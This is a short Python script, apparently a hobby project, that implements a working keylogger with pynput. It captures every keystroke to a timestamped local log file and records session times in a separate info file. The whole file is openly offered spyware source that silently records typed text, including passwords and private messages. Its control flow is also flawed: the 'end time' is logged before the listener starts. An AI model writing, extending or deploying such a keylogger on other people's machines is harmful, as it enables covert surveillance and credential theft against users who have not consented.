#imported modules
import os
from pynput import keyboard
from datetime import datetime

#getting current date and time
now = datetime.now()
now = (now.strftime("%Y-%m-%d %H-%M"))

# paths
log_folder = os.path.join(os.getcwd(), "logs")
log_file = os.path.join(log_folder, f"{now}_Keylogger_data.txt")
info_file = os.path.join(log_folder, "log_files_id_info.txt")

# ensure logs folder exists
os.makedirs(log_folder, exist_ok=True)


#creating and opening file
with open(log_file , "a") as file:
    file.write(" ")


#function triggers when a key is pressed
def pressed(key):
    try:
        key_pressed = format(key.char)
        with open(log_file, "a") as file:

            file.write(f'{key_pressed}')

    except:
        key_pressed = format(key)
        with open(log_file, "a") as file:
            if key_pressed == 'Key.backspace':
                file.write("*")
            if key_pressed == "Key.enter":
                file.write('\n')
            if key_pressed == "Key.space":
                file.write(" ")

try:
   pass
except KeyboardInterrupt:
    pass
finally:
    #getting the end time of the program
    end_time = datetime.now().strftime("%Y-%m-%d %H-%M")
    #saving all the info
    with open(info_file, "a") as file:
        file.write(f"Keylogger started at {now} and ended at {end_time} → File: {log_file}\n")

 #run the listener
    with keyboard.Listener(on_press=pressed) as listener:
        listener.join()